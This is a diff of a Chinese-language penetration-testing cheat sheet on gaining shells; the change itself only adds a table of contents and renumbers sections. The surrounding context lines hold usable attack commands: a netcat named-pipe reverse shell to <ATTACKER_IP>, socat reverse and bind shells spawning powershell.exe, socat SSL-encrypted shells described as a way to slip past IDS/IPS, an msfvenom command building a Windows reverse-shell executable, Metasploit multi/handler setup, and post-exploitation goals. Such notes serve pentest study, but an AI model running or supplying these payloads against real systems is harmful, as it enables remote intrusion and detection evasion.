@@ -1,8 +1,20 @@
-### 1. Shell概述
+
+#### 目录
+- [反弹Shell (Reverse Shell)](#1-反弹shell-reverse-shell)
+- [正向Shell (Bind Shell)](#2-正向shell-bind-shell)
+- [常用监听器 (Listeners)](#3-常用监听器-listeners)
+- [Shell Payload示例](#4-shell-payload示例)
+- [Webshell](#5-webshell)
+- [Shell稳定性与增强](#6-shell稳定性与增强)
+- [加密Shell (Socat)](#7-加密shell-socat)
+- [使用 `msfvenom` 生成Payload](#8-使用-msfvenom-生成payload)
+- [使用Metasploit `multi/handler` 接收Shell](#9-使用metasploit-multihandler-接收shell)
+- [获取Shell后的初步操作 (Post-Exploitation)](#10-获取shell后的初步操作-post-exploitation)
+
 #### 概述
 Shell是在目标系统上执行命令的一种方式。主要分为反弹Shell（Reverse Shell）和正向Shell（Bind Shell）。获取Shell是渗透测试中控制目标系统的关键步骤。
 
-### 2. 反弹Shell (Reverse Shell)
+### 1. 反弹Shell (Reverse Shell)
 #### 概述
 反弹Shell由目标机器主动发起连接到攻击者机器。这种方式通常用于目标机器防火墙限制入站连接，但允许出站连接的情况。
 #### 方法
@@ -29,7 +41,7 @@ Shell是在目标系统上执行命令的一种方式。主要分为反弹Shell�
         *   `| nc <ATTACKER_IP> <LISTENER_PORT>`: 将Shell的输出通过Netcat发送到攻击者的IP和端口。
         *   `> /tmp/f`: 将从Netcat接收到的（攻击者的命令）写回管道，完成双向通信。
 
-### 3. 正向Shell (Bind Shell)
+### 2. 正向Shell (Bind Shell)
 #### 概述
 正向Shell在目标机器上监听一个端口，等待攻击者主动连接。攻击者连接成功后，即可获得Shell。这种方式要求目标机器的防火墙允许入站连接到该监听端口。
 #### 方法
@@ -51,7 +63,7 @@ Shell是在目标系统上执行命令的一种方式。主要分为反弹Shell�
         *   `<TARGET_IP>`: 目标机器IP。
         *   `<BIND_PORT>`: 目标机器监听的端口。
 
-### 4. 常用监听器 (Listeners)
+### 3. 常用监听器 (Listeners)
 #### 概述
 监听器是在攻击者机器上运行的、用于接收反弹Shell连接或连接正向Shell的工具。
 #### 工具
@@ -70,7 +82,7 @@ Shell是在目标系统上执行命令的一种方式。主要分为反弹Shell�
     *   基本TCP监听: `socat TCP-LISTEN:<PORT> STDOUT`
     *   详细模式: `socat -d -d TCP-LISTEN:<PORT> STDOUT` (`-d`增加详细级别)
 
-### 5. Shell Payload示例
+### 4. Shell Payload示例
 #### 概述
 Shell Payload是在目标系统上执行的命令或脚本，用于创建反弹或正向Shell。以下是一些常见语言/工具的Payload示例（主要为反弹Shell）。
 #### Payloads
@@ -140,7 +152,7 @@ Shell Payload是在目标系统上执行的命令或脚本，用于创建反弹�
         ```
     *   **Nishang框架中的Invoke-PowerShellTcp.ps1脚本是更常用和功能完善的选择。**
 
-### 6. Webshell
+### 5. Webshell
 #### 概述
 Webshell是用Web服务器支持的语言（如PHP, ASP, JSP）编写的脚本，上传到目标Web服务器后，允许攻击者通过浏览器或其他HTTP客户端远程执行系统命令或管理文件。
 #### 特点
@@ -154,7 +166,7 @@ Webshell是用Web服务器支持的语言（如PHP, ASP, JSP）编写的脚本�
 #### 资源
 -   Kali Linux中预置了多种Webshell：`/usr/share/webshells/`
 
-### 7. Shell稳定性与增强
+### 6. Shell稳定性与增强
 #### 概述
 原始的Netcat Shell通常功能有限（例如，`Ctrl+C`会断开连接，不支持Tab补全、历史记录，无法运行`vim`等全屏应用）。需要进行稳定化处理以获得更好的交互体验。
 #### 方法
@@ -210,7 +222,7 @@ Webshell是用Web服务器支持的语言（如PHP, ASP, JSP）编写的脚本�
         *   Windows反弹: `socat TCP:<ATTACKER_IP>:<PORT> EXEC:powershell.exe,pipes`
         *   Windows绑定: `socat TCP-L:<PORT> EXEC:powershell.exe,pipes`
 
-### 8. 加密Shell (Socat)
+### 7. 加密Shell (Socat)
 #### 概述
 使用加密可以绕过某些基于流量特征检测的IDS/IPS。`socat` 支持SSL/TLS加密。
 #### 方法
@@ -252,7 +264,7 @@ Webshell是用Web服务器支持的语言（如PHP, ASP, JSP）编写的脚本�
         socat OPENSSL:<TARGET_IP>:<TARGET_PORT>,verify=0 FILE:`tty`,raw,echo=0
         ```
 
-### 9. 使用 `msfvenom` 生成Payload
+### 8. 使用 `msfvenom` 生成Payload
 #### 概述
 `msfvenom` 是Metasploit框架中的一个工具，用于生成各种格式的Shellcode和Payload（包括反弹和绑定Shell），支持多种平台和架构。
 #### 方法
@@ -275,7 +287,7 @@ Webshell是用Web服务器支持的语言（如PHP, ASP, JSP）编写的脚本�
     msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<LISTENER_PORT> -f exe -o reverse_shell.exe
     ```
 
-### 10. 使用Metasploit `multi/handler` 接收Shell
+### 9. 使用Metasploit `multi/handler` 接收Shell
 #### 概述
 Metasploit的 `exploit/multi/handler` 是一个通用的监听器，专门用于接收由`msfvenom`生成的（尤其是Meterpreter）Shell连接。
 #### 方法
@@ -290,7 +302,7 @@ Metasploit的 `exploit/multi/handler` 是一个通用的监听器，专门用于
     *   `exploit -j` (在后台作为作业运行，允许继续使用`msfconsole`)
 7.  当目标机器执行相应的`msfvenom`生成的Payload时，`multi/handler`会接收连接，并建立会话。
 
-### 11. 获取Shell后的初步操作 (Post-Exploitation)
+### 10. 获取Shell后的初步操作 (Post-Exploitation)
 #### 概述
 成功获取Shell后，通常需要进行信息收集、权限提升、持久化等后续操作。
 #### 常见初步目标
